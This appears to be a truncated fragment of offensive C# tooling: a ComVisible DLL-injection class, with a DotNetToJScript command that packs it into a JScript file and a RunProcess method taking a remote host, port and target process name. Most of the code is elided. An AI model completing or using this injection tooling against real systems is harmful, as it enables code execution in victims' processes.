...
// allow interaction
[ComVisible(true)]
public class DLLInject64_DN2JS
{
     ...
     * Example:
     *      DotNetToJScript.exe DLLInject64_DN2JS.dll --lang=Jscript -c DLLInject64_DN2JS -s <path_to_RunProcess_Args.txt> --ver=v4 -o DLLInject64_DN2JS.js
    */
    public void RunProcess(string rhost, string rport, string tgt_proc)
    {
        ...
        Process[] localByName = Process.GetProcessesByName(tgt_proc);
